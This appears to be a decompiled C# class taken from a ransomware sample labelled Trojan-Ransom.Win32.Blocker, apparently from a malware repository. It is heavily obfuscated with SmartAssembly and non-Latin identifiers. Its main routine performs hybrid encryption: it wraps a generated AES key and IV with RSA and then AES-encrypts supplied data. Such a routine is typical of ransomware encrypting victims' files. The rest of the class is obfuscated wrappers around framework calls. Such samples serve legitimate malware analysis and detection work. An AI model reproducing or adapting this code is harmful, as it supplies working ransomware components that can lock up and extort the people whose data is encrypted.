// Decompiled with JetBrains decompiler
// Type: Ⴈ.ႷႨ
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using SmartAssembly.Shared;
using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartExceptionsCore.UI;
using SmartAssembly.SmartUsageCore;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;

namespace Ⴈ
{
  internal sealed class ႷႨ
  {
    public static string Ⴗ;

    public static byte[] Ⴃ(byte[] Ⴅ, string Ⴐ)
    {
      int num1;
      byte[] numArray1;
      RijndaelManaged rijndaelManaged;
      RSACryptoServiceProvider cryptoServiceProvider;
      MemoryStream memoryStream;
      CryptoStream cryptoStream;
      int num2;
      byte[] numArray2;
      int num3;
      byte[] numArray3;
      int num4;
      byte[] numArray4;
      byte[] numArray5;
      byte[] numArray6;
      byte[] numArray7;
      byte[] numArray8;
      byte[] numArray9;
      int num5;
      int num6;
      int num7;
      int num8;
      object[] objArray;
      try
      {
        try
        {
          num1 = 1;
          while (true)
          {
            switch (num1)
            {
              case 2:
              case 6:
                goto label_4;
              case 3:
                goto label_3;
              case 4:
                goto label_5;
              default:
                num1 = !AppNameFinder.Ⴓ(Ⴐ, ႷႭ.ႥႳ(1491049465, 6), 494, 425) ? 4 : 3;
                continue;
            }
          }
label_3:
          ႷႨ.Ⴗ = ႷႭ.ႥႳ(1491049466, 1);
label_4:
          numArray1 = (byte[]) null;
          goto label_56;
label_5:
          rijndaelManaged = (RijndaelManaged) null;
          cryptoServiceProvider = (RSACryptoServiceProvider) null;
          memoryStream = (MemoryStream) null;
          cryptoStream = (CryptoStream) null;
          try
          {
            num2 = 1;
            while (true)
            {
              switch (num2)
              {
                case 0:
                  num2 = 5;
                  continue;
                case 2:
                  Ⴈ.Ⴀ.Ⴀ((SymmetricAlgorithm) rijndaelManaged, 762, 706);
                  AutoHeightLabel.Ⴐ((SymmetricAlgorithm) rijndaelManaged, 228, 154);
                  num2 = 3;
                  continue;
                case 3:
                  numArray2 = new byte[48];
                  AppPathFinder.Ⴍ((Array) SmartAssembly.SmartUsageCore.DoNotPruneAttribute.Ⴄ((SymmetricAlgorithm) rijndaelManaged, 921, 954), 0, (Array) numArray2, 0, 32, 499, 488);
                  goto case 0;
                case 4:
                case 7:
                  goto label_14;
                case 5:
                  AppPathFinder.Ⴍ((Array) SmartAssembly.SmartUsageCore.DoNotPruneAttribute.Ⴄ((SymmetricAlgorithm) rijndaelManaged, 589, 617), 0, (Array) numArray2, 32, 16, 99, 120);
                  goto case 8;
                case 8:
                  num2 = 4;
                  continue;
                default:
                  rijndaelManaged = new RijndaelManaged();
                  cryptoServiceProvider = new RSACryptoServiceProvider();
                  Ⴈ.Ⴜ.Ⴗ((AsymmetricAlgorithm) cryptoServiceProvider, Ⴐ, 911, 986);
                  num2 = 2;
                  continue;
              }
            }
label_14:
            memoryStream = new MemoryStream();
            try
            {
              num3 = 0;
              while (true)
              {
                switch (num3)
                {
                  case 1:
                  case 3:
                    FatalExceptionEventArgs.Ⴍ((Stream) memoryStream, SmartAssembly.SmartUsageCore.DoNotObfuscateAttribute.Ⴓ(numArray3.Length / 8, 656, 763), 779, 830);
                    num3 = 5;
                    continue;
                  case 5:
                    goto label_20;
                  case 6:
                    num3 = 3;
                    continue;
                  default:
                    numArray3 = ReportSender1.Ⴈ(cryptoServiceProvider, numArray2, false, 629, 620);
                    FatalExceptionEventArgs.Ⴍ((Stream) memoryStream, (byte) 1, 535, 546);
                    goto case 6;
                }
              }
label_20:
              ReportSender1.Ⴍ((Stream) memoryStream, numArray3, 0, numArray3.Length, 902, 1016);
            }
            catch (CryptographicException ex1)
            {
              try
              {
                num4 = 11;
                while (true)
                {
                  switch (num4)
                  {
                    case 0:
                    case 3:
                      FatalExceptionEventArgs.Ⴍ((Stream) memoryStream, (byte) 2, 520, 573);
                      FatalExceptionEventArgs.Ⴍ((Stream) memoryStream, SmartAssembly.SmartUsageCore.DoNotObfuscateAttribute.Ⴓ(numArray6.Length / 8, 419, 456), 788, 801);
                      goto case 9;
                    case 2:
                      AppPathFinder.Ⴍ((Array) SmartAssembly.SmartUsageCore.DoNotPruneAttribute.Ⴄ((SymmetricAlgorithm) rijndaelManaged, 428, 399), 16, (Array) numArray5, 0, 16, 838, 861);
                      num4 = 5;
                      continue;
                    case 4:
                      num4 = 7;
                      continue;
                    case 5:
                      numArray6 = ReportSender1.Ⴈ(cryptoServiceProvider, numArray4, false, 384, 409);
                      numArray7 = ReportSender1.Ⴈ(cryptoServiceProvider, numArray5, false, 96, 121);
                      goto case 4;
                    case 6:
                      ReportSender1.Ⴍ((Stream) memoryStream, numArray6, 0, numArray6.Length, 33, 95);
                      num4 = 8;
                      continue;
                    case 7:
                      numArray8 = ReportSender1.Ⴈ(cryptoServiceProvider, SmartAssembly.SmartUsageCore.DoNotPruneAttribute.Ⴄ((SymmetricAlgorithm) rijndaelManaged, 15, 43), false, 472, 449);
                      num4 = 0;
                      continue;
                    case 8:
                      ReportSender1.Ⴍ((Stream) memoryStream, numArray7, 0, numArray7.Length, 386, 508);
                      num4 = 10;
                      continue;
                    case 9:
                      num4 = 6;
                      continue;
                    case 10:
                      goto label_33;
                    default:
                      numArray4 = new byte[16];
                      numArray5 = new byte[16];
                      AppPathFinder.Ⴍ((Array) SmartAssembly.SmartUsageCore.DoNotPruneAttribute.Ⴄ((SymmetricAlgorithm) rijndaelManaged, 425, 394), 0, (Array) numArray4, 0, 16, 524, 535);
                      num4 = 2;
                      continue;
                  }
                }
label_33:
                ReportSender1.Ⴍ((Stream) memoryStream, numArray8, 0, numArray8.Length, 525, 627);
              }
              catch (CryptographicException ex2)
              {
                ႷႨ.Ⴗ = Ⴈ.Ⴀ.Ⴐ(1468303605, 7);
                numArray9 = (byte[]) null;
                goto label_53;
              }
              num5 = 3;
              switch (num5)
              {
              }
            }
            num6 = 2;
            while (true)
            {
              switch (num6)
              {
                case 0:
                  goto label_53;
                case 4:
                  num6 = 5;
                  continue;
                case 5:
                  goto label_40;
                default:
                  cryptoStream = new CryptoStream((Stream) memoryStream, Ⴈ.Ⴈ.Ⴈ((SymmetricAlgorithm) rijndaelManaged, 720, 728), CryptoStreamMode.Write);
                  ReportSender1.Ⴍ((Stream) cryptoStream, Ⴅ, 0, Ⴅ.Length, 8, 118);
                  goto case 4;
              }
            }
label_40:
            SmartAssembly.SmartExceptionsCore.DoNotPruneAttribute.Ⴀ(cryptoStream, 631, 587);
            numArray9 = ႳႭ.Ⴃ(memoryStream, 875, 893);
          }
          catch (Exception ex)
          {
            ႷႨ.Ⴗ = Ⴈ.Ⴀ.Ⴐ(1468303438, 6) + UsageReportSender.Ⴃ(ex, 466, 494);
            numArray9 = (byte[]) null;
          }
          finally
          {
            num7 = 12;
            while (true)
            {
              switch (num7)
              {
                case 0:
                case 8:
                  rijndaelManaged.Clear();
                  goto case 7;
                case 1:
                  memoryStream.Close();
                  goto case 4;
                case 2:
                case 10:
                case 11:
                  goto label_51;
                case 4:
                  num7 = cryptoStream == null ? 6 : 2;
                  continue;
                case 5:
                  num7 = memoryStream == null ? 4 : 1;
                  continue;
                case 6:
                  goto label_52;
                case 7:
                  num7 = cryptoServiceProvider == null ? 5 : 9;
                  continue;
                case 9:
                  cryptoServiceProvider.Clear();
                  goto case 5;
                default:
                  num7 = rijndaelManaged == null ? 7 : 8;
                  continue;
              }
            }
label_51:
            cryptoStream.Close();
label_52:;
          }
label_53:
          num8 = 3;
          switch (num8)
          {
            default:
              numArray1 = numArray9;
              break;
          }
        }
        catch (Exception ex)
        {
          objArray = new object[15]
          {
            (object) rijndaelManaged,
            (object) cryptoServiceProvider,
            (object) memoryStream,
            (object) cryptoStream,
            (object) numArray2,
            (object) numArray3,
            (object) numArray4,
            (object) numArray5,
            (object) numArray6,
            (object) numArray7,
            (object) numArray8,
            (object) ex,
            (object) numArray9,
            (object) Ⴅ,
            (object) Ⴐ
          };
          object[] objects = objArray;
          StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
label_56:
        switch (2)
        {
          default:
            return numArray1;
        }
      }
      catch (Exception ex)
      {
        int num9;
        object[] objects = new object[26]
        {
          (object) rijndaelManaged,
          (object) cryptoServiceProvider,
          (object) memoryStream,
          (object) cryptoStream,
          (object) numArray2,
          (object) numArray3,
          (object) numArray4,
          (object) numArray5,
          (object) numArray6,
          (object) numArray7,
          (object) numArray8,
          (object) ex,
          (object) numArray9,
          (object) objArray,
          (object) numArray1,
          (object) num1,
          (object) num2,
          (object) num3,
          (object) num4,
          (object) num5,
          (object) num6,
          (object) num7,
          (object) num8,
          (object) num9,
          (object) Ⴅ,
          (object) Ⴐ
        };
        StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    public ႷႨ()
    {
      try
      {
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException1(ex, (object) this);
        throw;
      }
    }

    static ႷႨ()
    {
      try
      {
        SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    internal static DialogResult Ⴅ([In] Form obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 100:
            num2 = 3;
            break;
          default:
            num2 = 5;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_3;
            case 1:
              num1 = 0;
              continue;
            case 2:
            case 3:
            case 4:
            case 6:
              goto label_8;
            case 5:
              num1 = 0;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႨ.Ⴅ);
              num1 = 0;
              continue;
          }
        }
label_8:
        return obj0.DialogResult;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        Form o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static MethodInfo Ⴐ([In] System.Type obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 19:
            num2 = 5;
            break;
          default:
            num2 = 6;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_3;
            case 1:
            case 6:
              num1 = 0;
              continue;
            case 3:
            case 5:
              goto label_8;
            case 4:
            case 7:
              num1 = 0;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႨ.Ⴐ);
              num1 = 0;
              continue;
          }
        }
label_8:
        return obj0.GetMethod(obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        System.Type o2 = obj0;
        string o3 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static byte[] Ⴄ([In] Encoding obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 118:
            num2 = 6;
            break;
          default:
            num2 = 1;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 1:
            case 2:
              num1 = 4;
              continue;
            case 4:
            case 7:
              goto label_3;
            case 5:
              num1 = 4;
              continue;
            case 6:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႨ.Ⴄ);
              num1 = 4;
              continue;
          }
        }
label_8:
        return obj0.GetBytes(obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        Encoding o2 = obj0;
        string o3 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static void Ⴈ([In] XmlWriter obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
        num1 = 0;
        while (true)
        {
          switch (num1)
          {
            case 1:
              num1 = 0;
              continue;
            case 2:
            case 3:
              goto label_7;
            case 4:
              goto label_8;
            case 5:
              goto label_10;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 9:
                  num2 = 2;
                  break;
                default:
                  num2 = 1;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_10:
        return;
label_7:
        obj0.WriteStartElement(obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        XmlWriter o3 = obj0;
        string o4 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj3;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }

    internal static int Ⴍ([In] Version obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 51:
            num2 = 1;
            break;
          default:
            num2 = 4;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 5:
              goto label_3;
            case 1:
              goto label_8;
            case 3:
              num1 = 0;
              continue;
            case 4:
            case 6:
              num1 = 0;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႨ.Ⴍ);
              num1 = 0;
              continue;
          }
        }
label_8:
        return obj0.Minor;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        Version o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static string Ⴜ([In] byte[] obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 123:
            num2 = 6;
            break;
          default:
            num2 = 0;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 3:
              num1 = 1;
              continue;
            case 1:
            case 5:
              goto label_3;
            case 2:
            case 7:
              num1 = 1;
              continue;
            case 6:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႨ.Ⴜ);
              num1 = 1;
              continue;
          }
        }
label_8:
        return Convert.ToBase64String(obj0);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        byte[] o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static void ႰႥ([In] object obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
        num1 = 5;
        while (true)
        {
          switch (num1)
          {
            case 1:
              num1 = 5;
              continue;
            case 3:
            case 4:
              goto label_7;
            default:
              int num2;
              switch (obj2 ^ obj1)
              {
                case 96:
                  num2 = 4;
                  break;
                default:
                  num2 = 1;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        Monitor.Enter(obj0);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        object o3 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static PlatformID ႰႰ([In] OperatingSystem obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 75:
            num2 = 5;
            break;
          default:
            num2 = 6;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 4:
              num1 = 2;
              continue;
            case 1:
            case 5:
              goto label_8;
            case 2:
              goto label_3;
            case 6:
              num1 = 2;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႨ.ႰႰ);
              num1 = 2;
              continue;
          }
        }
label_8:
        return obj0.Platform;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        OperatingSystem o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static string ႰႳ([In] System.Type obj0, [In] object obj1, [In] string obj2, [In] int obj3, [In] int obj4)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj4 ^ obj3)
        {
          case 5:
            num2 = 3;
            break;
          default:
            num2 = 1;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
              num1 = 6;
              continue;
            case 1:
              num1 = 6;
              continue;
            case 3:
              goto label_8;
            case 6:
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႨ.ႰႳ);
              num1 = 6;
              continue;
          }
        }
label_8:
        return Enum.Format(obj0, obj1, obj2);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        System.Type o2 = obj0;
        object o3 = obj1;
        string o4 = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj4;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct Ⴓ
    {
      internal byte[] Ⴗ;
      internal int Ⴓ;
      internal int Ⴍ;
      internal uint Ⴃ;
      internal int Ⴐ;
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct Ⴀ
    {
      internal byte Ⴗ;
    }
  }
}
